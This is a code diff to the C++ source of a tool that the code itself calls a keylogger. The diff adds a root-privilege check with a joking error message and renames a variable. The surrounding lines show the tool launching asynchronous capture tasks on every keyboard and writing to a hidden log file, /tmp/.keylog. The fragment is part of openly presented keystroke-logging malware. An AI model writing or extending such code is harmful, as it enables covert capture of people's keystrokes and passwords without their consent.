@@ -3,7 +3,19 @@
 
 namespace po = boost::program_options;
 
+void need_root(){
+    std::cerr << "You don't have permissions to start keylogger in case of\n"
+                 "attaching to processes and keyboards.\n"
+                 "Perhaps you are a bad boy O_o" << std::endl;
+    exit(1);
+}
+
 int main(int argc, char **argv) {
+
+    if(getuid() != 0) {
+        need_root();
+    }
+
     const fs::path path_to_log = "/tmp/.keylog";
     int64_t sleep_time = 3;
     if(!fs::exists(path_to_log)){
@@ -30,17 +42,15 @@ int main(int argc, char **argv) {
     std::vector<std::future<void>> captureTasks;
     captureTasks.reserve(keyboards.size());
 
-    auto kboard_log_flag = vm["kboard"].as<std::string>();
-    if (kboard_log_flag == "OFF") {
+    auto s = vm["kboard"].as<std::string>();
+    if (s == "OFF") {
         DEBUG_STDOUT("Logging keyboards: OFF");
-    } else if (kboard_log_flag == "ON"){
+    } else if (s == "ON"){
         DEBUG_STDOUT("Logging keyboards: ON");
         for (auto& kbd : keyboards)
             captureTasks.push_back(
                     std::async(std::launch::async, &Keyboard::capture, &kbd));
     }
-
-
 
     while(true){
         auto mode = vm["mode"].as<std::string>();
